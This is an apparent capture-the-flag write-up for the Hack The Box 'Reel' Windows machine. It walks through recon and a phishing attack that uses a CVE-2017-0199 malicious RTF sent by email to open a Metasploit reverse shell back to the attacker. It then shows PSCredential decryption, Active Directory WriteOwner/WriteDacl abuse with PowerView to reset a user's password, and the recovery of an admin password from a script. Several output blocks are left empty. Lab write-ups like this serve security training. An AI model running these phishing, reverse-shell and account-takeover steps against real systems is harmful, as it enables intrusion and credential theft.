{% include toc icon="cog" title="Reel Solution" %}

The [Reel](https://app.hackthebox.com/machines/Reel) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is an **hard** Windows Machine with a strong focus on Active Directory exploitation. This box was fun, it was nice to finally have a phishing part as well as a small DACL abuse attack chain.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.

```

**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
{: .notice--warning}

We have a few interesting ports, including **SSH** (22/TCP), **FTP** (21/TCP) and **SMTP** (25/TCP). Let's dig a bit more.

## Anonymous FTP

After playing around with Nmap [scripts](https://nmap.org/nsedoc/scripts/ftp-anon.html), we found an [anonymous FTP](https://datatracker.ietf.org/doc/html/rfc1635) access.

```bash
$ nmap -p 21 --script=ftp-anon -Pn 10.129.147.8
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 09:43 EDT

|_05-29-18  12:19AM       <DIR>          documents

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

An anonymous account accepts any string as a password and has limited access rights to an FTP server, but enough to be able to retrieve content.

```bash
$ ftp 10.129.147.8
Connected to 10.129.147.8.

```

Here, we found a bunch of documents on the FTP server. Let's start with the **readme.txt** file.

```bash
$ cat readme.txt         
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.   
```

It talks about sending RTF documents via email. In our context, it could make sense given the machine has its SMTP (TCP/25) port open. So we will probably need to send an email at some point. 

Now, let's check **AppLocker.docx**. It contains the following text:

```text
AppLocker procedure to be documented - hash rules for exe, 
msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

It seems the target computer have some [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) rules in place, we may need to bypass this security feature later.

For the last document, **WindowsEventForwarding.docx**, we didn't find anything interesting in it. However, using [exiftool](https://exiftool.org), a metadata reader, we were able to extract an email address.

```bash
$ exiftool WindowsEventForwarding.docx 
ExifTool Version Number         : 12.39
File Name                       : WindowsEventForwarding.docx

```

Here, it seems that our initial foothold will involve a phishing email that is able to bypass some AppLocker rules.

# Initial Access

According to the [MITRE](https://attack.mitre.org/techniques/T1566/), adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. 

## CVE-2017-0199

As we need to send an RTF file, it seemed pretty obvious to start with the [CVE-2017-0199](https://www.mandiant.com/resources/cve-2017-0199-hta-handler) exploit, named [office_word_hta](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/fileformat/office_word_hta.md) in Metasploit. 

This module creates a malicious RTF file that, when opened in vulnerable versions of Microsoft Word will lead to code execution. Let's configure this module with Metasploit.

```bash
msf6 exploit(windows/fileformat/office_word_hta) > show options 

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  hello.rtf        yes       The file name.
   SRVHOST   10.10.14.20      yes       The local host or network interface to listen on.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   default.hta      yes       The URI to use for the HTA file


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word
```

Now, we just need to enter the `exploit` command to generate the malicious file and start the listener.

```bash
msf6 exploit(windows/fileformat/office_word_hta) > exploit 
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.xx:443 
[+] hello.rtf stored at /root/.msf4/local/hello.rtf
[*] Using URL: http://10.10.14.xx:8080/default.hta
[*] Server started.
```

Note that our malicious file is stored in **/root/.msf4/local/hello.rtf**. Now, using [swaks](http://www.jetmore.org/john/code/swaks/), an SMTP test tool, we can send our payload to **nico@megabank.com**.

```bash
$ sudo swaks --to nico@megabank.com --server 10.129.147.8 --attach /root/.msf4/local/hello.rtf
[sudo] password for ax: 
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.

```

After waiting a few seconds, we should get a remote shell on the target machine.

```bash
msf6 exploit(windows/fileformat/office_word_hta) > 
[*] Sending stage (175174 bytes) to 10.129.147.8

```

Nice, we now have a remote shell and our **first flag**.

# Privileges Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Reading Creds

Looking around nico's **Desktop** folder, we found a file named **cred.xml**.

```bash
meterpreter > ls C:\\Users\\nico\\Desktop
Listing: C:\Users\nico\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  1468  fil   2017-10-27 19:59:16 -0400  cred.xml
100666/rw-rw-rw-  282   fil   2017-10-27 18:42:45 -0400  desktop.ini
100444/r--r--r--  32    fil   2017-10-27 19:40:33 -0400  user.txt
100666/rw-rw-rw-  162   fil   2017-10-27 17:34:38 -0400  ~$iledDeliveryNotification.doc
```

The file contains a **PSCredential** object with an encrypted password for **Tom**.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">

    </Props>
  </Obj>
</Objs>
```

Thanks to PowerShell and the corresponding Metasploit module,. we can [easily](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx) retrieve the cleartext password.

```bash
meterpreter > load powershell 
Loading extension powershell...Success.         
meterpreter > powershell_shell 
PS > $credential = Import-CliXml -Path c:\users\nico\desktop\cred.xml
PS > $credential.GetNetworkCredential().Password
1ts-mag1c!!!
PS > 
```

We didn't get any access using WinRM/SMB with these credentials, however, the remote machine does have an **SSH** (TCP/22) server running. Let's see if **tom** can use the service.

```
$ ssh tom@10.129.147.8   
tom@10.129.147.8's password: 


Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.    

tom@REEL C:\Users\tom> 
```

Nice, we have access to the remote machine through SSH.

## ACL Abuse

Digging through Tom's folders, we found some files related to BloodHound, including the result of a previous scan.

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir

               5 File(s)      1,568,054 bytes                                                                                   
               2 Dir(s)  15,741,628,416 bytes free                                                                              
```

The **acls.csv** file contains ACL related to the domain. We can easily grep some interesting data manually with PowerShell. Let's start with **tom**

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell        

PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern tom                      

...[snip]...                                 

"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"                                     
```

Here we can see that, **tom** has the *WriteOwner* permission over **claire** which means we can change the object owner to take over the object. Basically, we own **claire**. Let's see what this user can do.


```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern claire                   

...[snip]...

"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
```

That's really interesting, **claire** has *WriteDacl* privileges over **Backup_Admins** which means we could modify object's ACEs and take over  **Backup_Admins**.

Let's abuse the *WriteOwner* permission **tom** has over **claire**. Here, we used the *PowerView.ps1* PowerShell script that was already present on the machine. As a reminder, [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) is a tool that helps to gain network situational awareness on Windows domains, but it also has some interesting functionality.

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> cd .. 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> dir                                                                                


    Directory: C:\Users\tom\Desktop\AD Audit\BloodHound

```

Here, the *PowerView.ps1* module is imported in our PowerShell session. Using [Set-DomainObjectOwner](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) we can modify the owner of **claire** and set it to **tom**. Given we have full control over **claire**, we can use the [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) command to allow **tom** to reset claire's password.

Finally, we can use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) command to modify claire's password.

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $creds = ConvertTo-SecureString 'Qwerty123!' -AsPlainText -Force
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $creds -Verbose           
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'claire'                                              
VERBOSE: [Set-DomainUserPassword] Password for user 'claire' successfully reset   
```

Let's sse if we can get an SSH access with **claire** domain account.

```bash
$ ssh claire@10.129.147.8
claire@10.129.147.8's password: 

Microsoft Windows [Version 6.3.9600]

claire@REEL C:\Users\claire>
```

Yep! Now, given **claire** has *WriteDacl* privileges over **Backup_Admins**, we can add our account to this group.

```bash
claire@REEL C:\Users\claire>net group backup_admins claire /add

The command completed successfully.                 
```

Done and done.

## Getting the admin password

After some unsuccessful escalation paths, we found something interesting. Being a member of the **Backup_Admins** group gives us a full (F) access over the *C:\Users\Administrator* folder.

Note that we used the [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) command to display discretionary access control lists (DACLs) on the specified folder.

```bash
claire@REEL C:\Users>icacls Administrator
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)
              HTB\Backup_Admins:(OI)(CI)(F)
              HTB\Administrator:(OI)(CI)(F)
              BUILTIN\Administrators:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

Cool, we should be able to read the *root.txt* file.

```bash
claire@REEL c:\Users\Administrator\Desktop>type root.txt                                                                        
Access is denied.                                                                                                               
```

Or not. We may be missing some privileges... However, we have access to another folder, **Backup Scripts**.

```bash
claire@REEL c:\Users\Administrator\Desktop>cd "Backup Scripts"

```

The folder contains multiple scripts and one of them had interesting information in it.

```bash
claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                 
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"                                                                                                    

#Variables, only Change here                                                                                                    
$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location            
```

Let's see if this password works with the **administrator** account.

We now have access to the **second flag**.

Awesome! I hope you enjoyed it, I know I did :)
